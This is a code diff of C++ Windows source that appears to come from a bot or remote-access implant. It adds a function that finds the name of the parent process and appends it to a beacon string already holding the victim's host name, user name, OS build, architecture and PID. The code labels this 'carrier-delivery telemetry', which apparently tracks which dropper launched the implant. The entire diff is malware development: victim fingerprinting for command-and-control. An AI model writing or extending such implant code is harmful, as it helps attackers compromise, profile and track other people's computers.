@@ -240,25 +240,52 @@ static std::string getBotId() {
     return s;
 }
 
+// ─── parent process name (for carrier-delivery telemetry) ────────────────────
+static std::string getParentProcName() {
+    DWORD myPid = GetCurrentProcessId(), ppid = 0;
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snap == INVALID_HANDLE_VALUE) return "unknown";
+    PROCESSENTRY32A pe{ sizeof(pe) };
+    // Find our own PPID
+    if (Process32FirstA(snap, &pe)) {
+        do {
+            if (pe.th32ProcessID == myPid) { ppid = pe.th32ParentProcessID; break; }
+        } while (Process32NextA(snap, &pe));
+    }
+    // Find parent's exe name
+    if (ppid && Process32FirstA(snap, &pe)) {
+        do {
+            if (pe.th32ProcessID == ppid) {
+                CloseHandle(snap);
+                std::string n(pe.szExeFile);
+                for (auto& c : n) c = (char)tolower((unsigned char)c);
+                return n;
+            }
+        } while (Process32NextA(snap, &pe));
+    }
+    CloseHandle(snap);
+    return "unknown";
+}
+
 // ─── info string ─────────────────────────────────────────────────────────────
 static std::string getInfo() {
     char hn[64]={},user[64]={};
     DWORD hs=sizeof(hn),us=sizeof(user);
     GetComputerNameA(hn,&hs); GetUserNameA(user,&us);
-    // OS version via RtlGetVersion trick
     OSVERSIONINFOEXA osv{sizeof(osv)};
     typedef NTSTATUS(WINAPI*RtlGV)(PRTL_OSVERSIONINFOW);
     auto fn=(RtlGV)GetProcAddress(GetModuleHandleA("ntdll.dll"),"RtlGetVersion");
     if(fn) fn((PRTL_OSVERSIONINFOW)&osv);
-    char buf[256];
-    snprintf(buf,sizeof(buf),"host=%s|user=%s|os=Win%u.%u.%u|arch=%s|pid=%lu",
+    std::string pname = getParentProcName();
+    char buf[320];
+    snprintf(buf,sizeof(buf),"host=%s|user=%s|os=Win%u.%u.%u|arch=%s|pid=%lu|pname=%s",
              hn,user,osv.dwMajorVersion,osv.dwMinorVersion,osv.dwBuildNumber,
 #ifdef _WIN64
              "x64",
 #else
              "x86",
 #endif
-             GetCurrentProcessId());
+             GetCurrentProcessId(), pname.c_str());
     return buf;
 }
 
